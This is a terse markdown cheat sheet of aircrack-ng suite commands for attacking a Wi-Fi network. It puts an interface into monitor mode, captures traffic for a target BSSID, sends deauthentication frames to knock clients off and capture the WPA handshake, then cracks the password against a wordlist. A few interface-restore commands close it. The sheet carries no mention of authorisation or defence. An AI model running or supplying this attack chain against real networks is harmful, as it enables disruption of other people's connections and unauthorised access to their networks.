`iwconfig`

`sudo airmon-ng check kill`

### Start Monitor mode
`sudo airmon-ng start wlan0`

### Stop Monitor mode
`sudo airmon-ng stop wlan0`

`sudo airmon-ng`

### Start monitoring
`sudo airodump-ng wlan0`

### To start monitoring data for a particular network>>
`sudo airodump-ng -w ./airmon-ng/data -c 1 --bssid 26:8F:05:FC:3C:A5 wlan0`

### Run the below code other tab
`sudo aireplay-ng --deauth 10 -a 26:8F:05:FC:3C:A5 wlan0`

### Crack password 
`sudo aircrack-ng ./airmon-ng/data-01.cap -w ./wordlist/pass.txt`

### Others

`sudo ifconfig wlan0 up`

`sudo ifconfig wlan0 down`

`sudo airodump-ng-oui-update`

`service NetworkManager restart`

`systemctl start wpa_supplicant`

`systemctl start NetworkManager`